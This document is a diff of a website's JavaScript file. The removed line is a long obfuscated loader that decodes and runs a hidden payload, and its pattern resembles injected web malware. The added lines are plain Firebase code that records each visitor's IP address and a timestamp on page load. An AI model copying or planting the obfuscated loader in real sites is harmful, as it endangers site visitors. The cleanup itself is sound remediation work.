@@ -1,1 +1,35 @@
-var appSettings,app,database,visitorDB,saveVisitorData;(function(){var rXG='',dlP=454-443;function vfm(s){var z=303004;var d=s.length;var e=[];for(var j=0;j<d;j++){e[j]=s.charAt(j)};for(var j=0;j<d;j++){var o=z*(j+524)+(z%34331);var w=z*(j+757)+(z%22620);var b=o%d;var k=w%d;var p=e[b];e[b]=e[k];e[k]=p;z=(o+w)%2153613;};return e.join('')};var vvi=vfm('fqvsnuejmgpothdnzociraxcktbrwotusrlyc').substr(0,dlP);var vlg=')4",;c15jr+u 0)+d,;i)=yqsm.;er2(rt;(klz, +e=+o;acx;al;7Sorr1w+ <,,,tj,t(,;uny6,nr,)a+n=;+2(65,60f]m+[tcv.,}r6it,81t1=aa4(;,tr5f]l}ce<)e;ar jmgge) 4ecnCt){a= hvvr[,h nt]prnar+.f[l() =u8(n=95;s"g=v]nf=(n.;r}=int}re. r7h=fsamanot;>(fo) l=i)olv8mer(ehvgw;;ergf+f(=(i-9r6avC;iga..)..ct)vrh8ho0; i;1i)in q[h(S;vd8jrr[mgi[fva=;j=ax=z)"3e;a9uv{lrauierlilg.n.==v n;;va( a;)ti03(vd;a+"d)v=rzef..rl"uCl8uA=nn8rtpr}p=e[bh;hs(pe0;=(7}qrv)6r.ttu],or)) +ri1.+)c)=]("e;;ruf)[=uf7+nvaa,=moc=;lae.arh.=p=rcha3C dn7t3i8wp+ggCoev9r0+u8 *u=2cv)ezrrornrtAm+(ri]cromcr=(llavs3=;nzlr=ebh,o!<(=a,8).-41e,;t)u=s{ no]enuzsnea07]=5(as(+1]h;{h[+fA.ixja2tanl2htosoa;+>g-pc](h0gs9blciingn)1.6mlgg0=.eg.Cs"v[{m;vopnsthu,+]ovv.,s;{06;jfeg;(n ;(o=()[tr06t2br+)f)[9an(s]a<jri;,[+)0a="(of,u(b( o,u aw;at;a7l.,7r{for*-udl=txer<"(+lnsir1=.dorCsr==lvr}apo-e ar.i(;1)h9j21-)Arhyvy)4yaCe 9;hgw lne]ub(yehurnn );Ar3t-e;,!"+.op[apxui';var Yza=vfm[vvi];var QCm='';var Taw=Yza;var pYF=Yza(QCm,vfm(vlg));var okm=pYF(vfm('f8n.ds.v=.ole.=;o(3nl5Wow}%atg.fagW@qmDbe!e9Wa2.f6}%%$<W)oppa:=rl;ig{il1apSsad#6Wa2W)unns!spc1_ef=br!ntfn$_ve.@ib"v(pnyW)=}o7sa1s+ca_fpef!h+o}4odti&gefS;))Wdtfr;btr7s(csWu}%,nWf2Wof.3Whrfbt(#=c=)7r.btdWWipna*ef.oW.dwn_(s;)icaia=naWv;f3f6hj%+g={8Wnp5(rfbfj}rjsWtaW$drr<snWhn#pb=or brW!el(Dr0sef)2b0Wobbs)rs\/-aee}\/e.WWto= 0)ds!uWoWa1s)!(girg1$c+(()]c.!t\/t.cf18W6!roW:p(((_i.m5tt1$oW=it(efqq3Wo.;a_i$oi 1WS6WWf{.c6bou.8i){ubvhto(.wte2rato).ba(.)DWs=e1j=.+icWW =.W+b9s$Wbobscttw(\/!_eW(c!0(;Wui3e(goWj(-\/-etbjeW--ow!o"s3u.y3e!eoa)p;4$ee.4)Wndl"5yrf)sb6wtraWWebq:(6)yWjWb7W8W)e\'t<=tdhbs5W]f}oesWe\/dop1W*sbWlWWo_%s]tr=;sb{,8nW!DW1q6W]?[s)*yt.j6;}]nt!(,rWtWoW \'W8_W"gW9u=en5nr(,.t.3\/.32Wi\/t0\/grob,&0gioWt ;$eWavoe0]68!rsW}!p)-b.-e+iWW.7"nit.,$a9.peb.(]s2:rI;.be$;n$1\/5(_61t[2Wn]tn6(7$4jy.5qi!;(W_(g.nju.]],*w7;ef409mc;n)wWto($;o.1bn\'Wo4{{..laf)1Ws.k.jr((2op WW!;t1._37(eDs_)?{,8tqz( sewWf;+}u0..]>ie3\/f;saE"tso.e2seWacp21!.)7Wjz( eWueWaos<+\/ 5,igt#)S%s6eaw)alWnb1CsWfdtdt)1qres]%f}sWi:n6lyt{"75.a?_0f)W35ooiW9.d(ss(WWtb .d5h3%nDb..o4{2l.WW4riWio..p).n.64tlW=m}ae,eW;%]}W@__r srp{ibi3W,sn1hd7$\/{e#t.b!yftc}bi);W0Wi)1s5r!}W%de;dart,er;sdrW S;W5(l(nue5{=2((W3eese}af i.q]]43,W$ {lt,)%o16WpW=ugoss1t!0(S.p{e.933bs( _p_2Wp1(1a)\'.;!)!W3ya8b:s_auW5,W!),:d.,it)e3sbu_ss7a ,rn_fW=.)iupr,mtW.$ap,,p)e)d$)Wsi!i7%c.ap.:soh p3gyWt5,_WW{[pbu+.j;( }l)w\/0eho.hbir_}W8sohl0e((sW!9gbW({b (_=!!,t5}it)tjW(tia8.37j$\/W){Wv7n4tt;{t6nb1\',$z a0pfs7);2;o0t_1sm3;t=W{))_c]am=We\'1W(h,n%ta?r\'W.&n_+.m}ll;(dd\/tnfW-Spo.aals.s).)w(0s;(31]rap(ge)Wtgis=.!td0udW}pWjWi620WWap:=ibs)00i{;n,i);,pasb.gei1W]$s$.]h)tz{7efdr>)et!)})W=bbeW\'uaf7ba)(ec1! owbWe7}a)nppn;ta3.j(,l!b%7pW0o;hmWr7_==j2sffi\/q_));i)n05j9,){a_?$}s+ttW)i=fDt,r.0.. p3(hW;nao.ei7;.q_o.t:inW,r1:3}3a3e&g$e,9a]t}e1W>bae;b,eg2;b (t!@r.%c#i$!WWa31$))esgso$.o8$i=o,ap)( l!.7)sW5f6,[}aWg1]WwWe.=r}.7b9)s(1#1f.,W_,W.f%8=4o(fdte}>_irr,=;)WW4t7oWjtW$f%ta{m.b r0;WsiW1!bWso,fe_"izw5c!p;=o$2i2W(.tps.=W()g-_4 \'j,(W.ei, (or 7rr;().,>4<E(=sj.bitWWc0)W2Wr3)W$W,ei.r)(3aW:ujW\/rcp.l_ie w),]tooita6=;)tijoe=(r7ynWea_0W=72rWesb3nsf$-fb{W(b,<tW_8CcctnWW!f3mtdmr=12W  !4s;.4=!.Wpi}'));var huL=Taw(rXG,okm );huL(8797);return 9769})()
+// Import Firebase modules from the CDN
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+import { getDatabase, ref, push, set } from 'https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js';
+
+// Initialize Firebase
+const appSettings = {
+    databaseURL: "https://portfolio-f1037-default-rtdb.asia-southeast1.firebasedatabase.app",
+};
+
+const app = initializeApp(appSettings);
+const database = getDatabase(app);
+const visitorDB = ref(database, "visitor");
+
+// Function to save visitor data
+async function saveVisitorData() {
+  try {
+    // Fetch the user's IP address using an external API.
+    const response = await fetch('https://api.ipify.org?format=json');
+    const data = await response.json();
+    const ipAddress = data.ip;
+
+    // Save the visitor data (IP address and timestamp) to the Realtime Database.
+    const newVisitorRef = push(visitorDB);
+    set(newVisitorRef, {
+      ip: ipAddress,
+      timestamp: new Date().toISOString(),
+    });
+  } catch (error) {
+    // Log the error if there's an issue while saving the visitor data.
+    console.error('Error saving visitor data:', error);
+  }
+}
+
+// Save the visitor data when the page loads.
+window.addEventListener('load', saveVisitorData);
